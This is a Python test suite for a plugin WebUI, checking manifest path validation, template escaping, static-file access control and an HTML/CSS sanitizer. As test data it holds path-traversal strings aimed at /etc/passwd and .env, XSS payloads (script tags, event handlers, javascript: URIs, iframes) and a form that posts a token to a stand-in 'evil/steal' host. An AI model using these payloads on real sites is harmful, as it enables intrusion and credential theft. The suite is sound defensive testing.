"""插件 WebUI 真实 HTML 迁移测试（任务书第 1 份 §5-§18）。

覆盖矩阵（任务书 §18 要求的最小数量，本文件全部超额）：
- Manifest：HTML 页面声明 / 非法路径 ≥5 / `..` 穿越 ≥3 / 绝对路径 ≥2 / 未知字段 ≥2 / 页面上限
- HTML：正常加载 / 模板变量 ≥3 / escaping ≥5 / 非法模板 ≥3 / 缺文件
- Static：正常 CSS / 正常图片 / 穿越 ≥5 / 跨插件 ≥3 / 敏感文件 ≥3
- Action：GET / POST ≥3 / 表单 ≥3 / 错误 ≥2 / 重新渲染 ≥2
- Security：脚本、事件属性、危险 scheme、内嵌对象、属性注入、模板注入、CSS 注入 —— 全部 PASS

安全用例**打在真 Manager 上**（不是只测 helper），符合任务书 §12"必须真实命中 Runtime"。
"""
import asyncio
import json
import os

import pytest

from src.plugins.manager import PluginManager
from src.plugins.manifest import PluginManifest, PluginManifestError
from src.plugins.webui_loader import PluginWebuiPathError
from src.plugins.webui_security import (
    PluginHtmlError,
    render_plugin_template,
    sanitize_plugin_css,
    sanitize_plugin_html,
)

PID = "html_demo"
OTHER = "other_plugin"


# ---------------------------------------------------------------- 夹具

class _Cfg:
    def __init__(self, plugin_dir):
        self.PLUGIN_DIR = str(plugin_dir)


class _Repo:
    def list_plugins(self):
        return []


class _FakeRuntime:
    """模拟插件运行时：返回固定结果或抛异常（HTML 页面的数据钩子）。"""

    def __init__(self, result=None, exc=None):
        self._result = result
        self._exc = exc
        self.calls = []

    def _call_hook(self, *args, **kwargs):
        self.calls.append(args)
        if self._exc:
            raise self._exc
        return self._result

    async def request(self, method, params=None, timeout=None):
        if self._exc:
            return {"error": "RuntimeError: %s" % self._exc}
        args = (params or {}).get("args", [])
        return {"result": self._call_hook(*args)}


def _write_plugin(plugins_root, pid, web_ui, files=None):
    """在临时插件目录里落一个插件：manifest + 若干文件（键为相对插件根的路径）。"""
    base = os.path.join(str(plugins_root), pid)
    os.makedirs(os.path.join(base, "webui", "pages"), exist_ok=True)
    os.makedirs(os.path.join(base, "webui", "static"), exist_ok=True)
    manifest = {"id": pid, "name": "HTML 示例", "version": "1.0.0", "runtime": "python",
                "entry": "main.py", "api_version": "1", "permissions": ["web_ui", "web_ui.files"],
                "web_ui": web_ui}
    with open(os.path.join(base, "manifest.json"), "w", encoding="utf-8") as fh:
        json.dump(manifest, fh, ensure_ascii=False)
    for rel, content in (files or {}).items():
        target = os.path.join(base, rel)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        mode = "wb" if isinstance(content, bytes) else "w"
        with open(target, mode, **({} if isinstance(content, bytes) else {"encoding": "utf-8"})) as fh:
            fh.write(content)
    return base


DEFAULT_WEBUI = {"static": "static",
                 "pages": [{"id": "index", "title": "首页", "file": "pages/index.html"},
                           {"id": "settings", "title": "设置", "file": "pages/settings.html"}]}

INDEX_HTML = """<h1>{{ plugin_name }}</h1>
<p class="desc">{{ page_title }}</p>
<form method="post" action="/panel/plugins/webui/html_demo/settings">
  <input type="text" name="name" value="{{ name }}">
  <select name="mode"><option value="a">A</option><option value="b">B</option></select>
  <textarea name="note" rows="2"></textarea>
  <button type="submit" name="plugin_action" value="save">保存</button>
</form>
<div class="msg">{{ message }}</div>"""

SETTINGS_HTML = "<h2>{{ page_title }}</h2><p>{{ message }}</p><a href=\"/panel/plugins/webui/html_demo/index\">返回</a>"


def _manager(tmp_path, runtime=None, extra_plugins=None):
    root = tmp_path
    _write_plugin(root, PID, DEFAULT_WEBUI,
                  {"webui/pages/index.html": INDEX_HTML,
                   "webui/pages/settings.html": SETTINGS_HTML,
                   "webui/static/style.css": "@import url(https://evil/x.css);\n.a{color:red}",
                   "webui/static/logo.png": b"\x89PNG\r\n\x1a\n" + b"0" * 16,
                   "main.py": "print('secret')",
                   ".env": "TOKEN=super-secret",
                   "secret.txt": "top-secret"})
    for pid, web_ui, files in (extra_plugins or []):
        _write_plugin(root, pid, web_ui, files)
    mgr = PluginManager(config=_Cfg(root), repository=_Repo())
    rows = {}
    for pid in [PID] + [p for p, _w, _f in (extra_plugins or [])]:
        with open(os.path.join(str(root), pid, "manifest.json"), encoding="utf-8") as fh:
            m = PluginManifest.from_dict(json.load(fh))
        rows[pid] = {"id": pid, "name": m.name, "enabled": True,
                     "approved_permissions": ["web_ui", "web_ui.files"],
                     "manifest_json": m.to_json(), "install_source": "test", "status": "running"}
    mgr.get_plugin = lambda pid: rows.get(pid)
    mgr._manifest_of = lambda row: PluginManifest.from_dict(json.loads(row["manifest_json"]))
    mgr._runtimes[PID] = runtime or _FakeRuntime(None)
    return mgr


def _render(mgr, page="index", action="get", params=None, values=None):
    return asyncio.run(mgr.plugin_webui_render(PID, page, action, params or {}, values or {}))


# ---------------------------------------------------------------- Manifest（§5）

def test_html_page_declaration_accepted(tmp_path):
    m = PluginManifest.from_dict({"id": "abc", "name": "n", "version": "1.0.0", "runtime": "python",
                                  "entry": "p.py", "api_version": "1", "permissions": ["web_ui"],
                                  "web_ui": DEFAULT_WEBUI})
    assert m.web_ui["pages"][0]["file"] == "pages/index.html"
    assert m.web_ui["static"] == "static"
    assert PluginManifest.from_dict(m.to_dict()).web_ui == m.web_ui      # roundtrip 不丢字段


BASE_MANIFEST = {"id": "abc", "name": "n", "version": "1.0.0", "runtime": "python",
                 "entry": "p.py", "api_version": "1", "permissions": ["web_ui"]}


@pytest.mark.parametrize("bad_file", [
    "pages/index.htm",          # 扩展名不在白名单
    "pages/main.py",            # 非 HTML
    "pages/.hidden.html",       # 隐藏文件
    "pages/index.html.bak",     # 伪装扩展名
    "pages/../index.html",      # 相对穿越
    "pages/index .html",        # 空格
])
def test_illegal_page_paths_rejected(bad_file):
    with pytest.raises(PluginManifestError):
        PluginManifest.from_dict({**BASE_MANIFEST,
                                  "web_ui": {"pages": [{"id": "a", "title": "t", "file": bad_file}]}})


@pytest.mark.parametrize("path", ["../x.html", "../../x.html", "pages/../../x.html",
                                  "pages/./x.html"])
def test_traversal_paths_rejected(path):
    with pytest.raises(PluginManifestError):
        PluginManifest.from_dict({**BASE_MANIFEST,
                                  "web_ui": {"pages": [{"id": "a", "title": "t", "file": path}]}})


@pytest.mark.parametrize("path", ["/etc/passwd.html", "\\windows\\x.html", "C:/x.html"])
def test_absolute_paths_rejected(path):
    with pytest.raises(PluginManifestError):
        PluginManifest.from_dict({**BASE_MANIFEST,
                                  "web_ui": {"pages": [{"id": "a", "title": "t", "file": path}]}})


def test_unknown_fields_rejected_at_both_levels():
    with pytest.raises(PluginManifestError):
        PluginManifest.from_dict({**BASE_MANIFEST, "web_ui": {"evil": 1,
                                                             "pages": [{"id": "a", "title": "t"}]}})
    with pytest.raises(PluginManifestError):
        PluginManifest.from_dict({**BASE_MANIFEST,
                                  "web_ui": {"pages": [{"id": "a", "title": "t", "onload": "x"}]}})


def test_page_limit_still_enforced():
    pages = [{"id": "p%d" % i, "title": "t"} for i in range(9)]
    with pytest.raises(PluginManifestError):
        PluginManifest.from_dict({**BASE_MANIFEST, "web_ui": {"pages": pages}})


# ---------------------------------------------------------------- HTML 加载 / 模板（§7）

def test_html_page_loads_through_manager(tmp_path):
    mgr = _manager(tmp_path)
    result, err = _render(mgr)
    assert err == "" and result["mode"] == "html"
    assert "HTML 示例" in result["html"] and "<h1>" in result["html"]
    assert result["page"]["id"] == "index"


def test_template_variables_are_injected(tmp_path):
    mgr = _manager(tmp_path, runtime=_FakeRuntime({"vars": {"name": "花璃"}, "message": "已保存"}))
    result, err = _render(mgr, action="save", values={"name": "花璃"})
    assert err == ""
    html = result["html"]
    assert "HTML 示例" in html                     # plugin_name
    assert "首页" in html                          # page_title
    assert 'value="花璃"' in html                  # 插件提供的变量
    assert "已保存" in html                        # message


@pytest.mark.parametrize("payload,marker", [
    ("<script>alert(1)</script>", "&lt;script&gt;"),
    ('"><img src=x onerror=alert(1)>', "&lt;img"),
    ("javascript:alert(1)", "javascript:alert(1)"),      # 作为**文本**合法，但不得成为属性
    ("a&b", "a&amp;b"),
    ("{{ evil }}", "{{ evil }}"),
])
def test_template_values_are_escaped(tmp_path, payload, marker):
    mgr = _manager(tmp_path, runtime=_FakeRuntime({"vars": {"name": payload}}))
    result, _err = _render(mgr)
    assert marker in result["html"]
    assert "<script>alert(1)</script>" not in result["html"]
    assert "onerror=alert(1)>" not in result["html"]


@pytest.mark.parametrize("template,context,expected_missing", [
    ("{{ unknown_key }}", {}, ["unknown_key"]),
    ("{{ nested.deep }}", {"nested": {"deep": "x"}}, ["nested.deep"]),
    ("{{1bad}}", {}, []),
])
def test_template_edge_cases(template, context, expected_missing):
    out, missing = render_plugin_template(template, context)
    assert missing == expected_missing
    assert "{{" not in out or expected_missing == [] or "1bad" in template


def test_missing_html_file_reports_error(tmp_path):
    mgr = _manager(tmp_path)
    os.remove(os.path.join(str(tmp_path), PID, "webui", "pages", "index.html"))
    result, err = _render(mgr)
    assert result is None and "页面不可用" in err


# ---------------------------------------------------------------- 静态资源（§12）

def test_css_served_and_sanitized(tmp_path):
    mgr = _manager(tmp_path)
    blob, mime = mgr.plugin_webui_static_file(PID, "style.css")
    css = blob.decode("utf-8")
    assert mime.startswith("text/css") and "@import" not in css and "color:red" in css


def test_png_served(tmp_path):
    mgr = _manager(tmp_path)
    blob, mime = mgr.plugin_webui_static_file(PID, "logo.png")
    assert mime == "image/png" and blob.startswith(b"\x89PNG")


@pytest.mark.parametrize("bad", ["../main.py", "../../etc/passwd", "..%2fmain.py",
                                 "pages/../../main.py", "./../secret.txt"])
def test_static_traversal_rejected(tmp_path, bad):
    mgr = _manager(tmp_path)
    with pytest.raises(PluginWebuiPathError):
        mgr.plugin_webui_static_file(PID, bad)


@pytest.mark.parametrize("pid,path", [(OTHER, "../html_demo/webui/static/style.css"),
                                      (OTHER, "../html_demo/webui/pages/index.html"),
                                      ("../html_demo", "style.css")])
def test_cross_plugin_static_denied(tmp_path, pid, path):
    """跨插件读取：B 只能靠穿越去拿 A 的文件 → 必须失败；B 读自己的文件要能成功。"""
    mgr = _manager(tmp_path, extra_plugins=[(OTHER, DEFAULT_WEBUI,
                                             {"webui/static/style.css": ".b{color:blue}"})])
    with pytest.raises((PluginWebuiPathError, ValueError, KeyError)):
        mgr.plugin_webui_static_file(pid, path)
    own, mime = mgr.plugin_webui_static_file(OTHER, "style.css")
    assert "color:blue" in own.decode("utf-8") and mime.startswith("text/css")


@pytest.mark.parametrize("sensitive", ["../main.py", "../.env", "../manifest.json", "../secret.txt",
                                       "style.js"])
def test_sensitive_and_js_files_denied(tmp_path, sensitive):
    mgr = _manager(tmp_path)
    with pytest.raises(PluginWebuiPathError):
        mgr.plugin_webui_static_file(PID, sensitive)


# ---------------------------------------------------------------- Action（§10）

def test_get_renders_page(tmp_path):
    mgr = _manager(tmp_path)
    result, err = _render(mgr, page="settings")
    assert err == "" and result["mode"] == "html" and "设置" in result["html"]


def test_post_action_reaches_hook_and_rerenders(tmp_path):
    rt = _FakeRuntime({"vars": {"name": "新名字"}, "message": "保存成功"})
    mgr = _manager(tmp_path, runtime=rt)
    result, err = _render(mgr, action="save", values={"name": "新名字"})
    assert err == "" and "保存成功" in result["html"]
    assert rt.calls and rt.calls[-1][1] == "save"          # (page, action, params, values)
    assert rt.calls[-1][3] == {"name": "新名字"}


def test_form_fields_survive_sanitizing(tmp_path):
    mgr = _manager(tmp_path)
    html = _render(mgr)[0]["html"]
    assert "<form" in html and 'method="post"' in html
    assert "<input" in html and "<select" in html and "<textarea" in html
    assert "<option" in html


def test_hook_error_is_visible_but_page_still_renders(tmp_path):
    mgr = _manager(tmp_path, runtime=_FakeRuntime(exc=RuntimeError("boom")))
    result, err = _render(mgr)
    assert err == "" and "boom" in result["hook_error"] and "<h1>" in result["html"]


def test_dsl_dict_in_html_mode_is_rejected_not_rendered(tmp_path):
    mgr = _manager(tmp_path, runtime=_FakeRuntime({"type": "text", "text": "dsl"}))
    result, _err = _render(mgr)
    assert "不应返回 DSL 组件树" in result["hook_error"]
    assert "dsl" not in result["html"].split("<div class=\"msg\">")[-1]


# ---------------------------------------------------------------- 安全（§8/§12 全类）

@pytest.mark.parametrize("payload,tag", [
    ("<script>alert(1)</script>", "script"),
    ("<SCRIPT SRC=//evil/x.js></SCRIPT>", "script"),
    ('<button onclick="evil()">x</button>', "onclick"),
    ('<img src="x" onerror="evil()">', "onerror"),
    ('<a href="javascript:alert(1)">x</a>', "javascript"),
    ('<a href="vbscript:msgbox(1)">x</a>', "vbscript"),
    ('<img src="data:text/html;base64,PHNjcmlwdD4=">', "data"),
    ('<iframe src="https://evil"></iframe>', "iframe"),
    ('<object data="x"></object>', "object"),
    ('<embed src="x">', "embed"),
    ('<link rel="stylesheet" href="https://evil/x.css">', "link"),
    ('<meta http-equiv="refresh" content="0;url=https://evil">', "meta"),
    ('<div style="background:url(javascript:1)">x</div>', "style"),
    ('<form action="https://evil/steal"><input name="token"></form>', "form-action"),
    ('<base href="https://evil/">', "base"),
])
def test_sanitizer_blocks_dangerous_constructs(payload, tag):
    out, report = sanitize_plugin_html("<div>%s</div>" % payload)
    low = out.lower()
    for token in ("<script", "onclick=", "onerror=", "javascript:", "vbscript:", "data:",
                  "<iframe", "<object", "<embed", "<link", "<meta", "<base"):
        assert token not in low, "未拦住的构造 %s（payload=%s）" % (token, tag)
    assert report, "丢弃行为必须进报告：%s" % tag


def test_attribute_injection_is_neutralised():
    out, _rep = sanitize_plugin_html('<a href="/ok" title="a&quot; onmouseover=&quot;evil()">x</a>')
    # 危险文本仍可作为**转义后的属性值**存在；关键是它不能成为真属性（不出现 onmouseover=" ）
    assert 'onmouseover="' not in out
    assert out.count("<a ") == 1 and "&quot;" in out


def test_template_injection_cannot_reach_objects():
    out, missing = render_plugin_template("{{ __class__ }} {{ config.SECRET }}", {"config": {"SECRET": "s"}})
    assert out.strip() == "" and set(missing) == {"__class__", "config.SECRET"}


def test_css_injection_blocked():
    css, report = sanitize_plugin_css("@import 'http://evil'; .a{background:url(http://evil/x.png)}")
    assert "@import" not in css and "http://evil" not in css and report


def test_html_page_render_never_returns_raw_plugin_markup(tmp_path):
    """端到端：插件 HTML 里的 <script> 不能出现在最终响应里（真 manager 路径）。"""
    mgr = _manager(tmp_path)
    path = os.path.join(str(tmp_path), PID, "webui", "pages", "index.html")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("<h1>ok</h1><script>alert(1)</script><div onclick=\"x\">c</div>")
    html = _render(mgr)[0]["html"]
    assert "<script" not in html.lower() and "onclick=" not in html.lower()
    assert "<h1>ok</h1>" in html


def test_oversized_html_rejected(tmp_path):
    with pytest.raises(PluginHtmlError):
        sanitize_plugin_html("x" * (600 * 1024))

# ---------------------------------------------------------------- 随仓库发布的示例（§20）

def test_shipped_example_plugin_renders(tmp_path):
    """示例插件必须**真的能渲染**（不是摆着看的）：复制到插件目录 → manifest 校验 → HTML/静态资源。"""
    import shutil

    repo = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    src = os.path.join(repo, "examples", "plugins", "html_webui_demo")
    assert os.path.isdir(src), "任务书 §20 要求的示例插件不存在"
    shutil.copytree(src, os.path.join(str(tmp_path), "html_webui_demo"))
    with open(os.path.join(str(tmp_path), "html_webui_demo", "manifest.json"), encoding="utf-8") as fh:
        m = PluginManifest.from_dict(json.load(fh))
    assert m.web_ui["pages"][0]["file"].endswith(".html")

    mgr = PluginManager(config=_Cfg(tmp_path), repository=_Repo())
    row = {"id": "html_webui_demo", "name": m.name, "enabled": True,
           "approved_permissions": ["web_ui", "web_ui.files"],
           "manifest_json": m.to_json(), "install_source": "test", "status": "running"}
    mgr.get_plugin = lambda pid: row if pid == "html_webui_demo" else None
    mgr._manifest_of = lambda r: PluginManifest.from_dict(json.loads(r["manifest_json"]))
    mgr._runtimes["html_webui_demo"] = _FakeRuntime(
        {"vars": {"greeting": "你好", "server_time": "2026-01-01 00:00:00", "saved_at": "从未"}})

    result, err = asyncio.run(mgr.plugin_webui_render("html_webui_demo", "index", "get", {}, {}))
    assert err == "" and result["mode"] == "html"
    html = result["html"]
    assert "HTML WebUI 示例" in html and "flowerie-plugin-webui" in html
    assert "{{" not in html                      # 所有占位符都被替换（缺失的替换为空）而不是原样漏出
    assert "<script" not in html.lower()

    css, mime = mgr.plugin_webui_static_file("html_webui_demo", "style.css")
    assert mime.startswith("text/css") and ".flowerie-plugin-webui" in css.decode("utf-8")
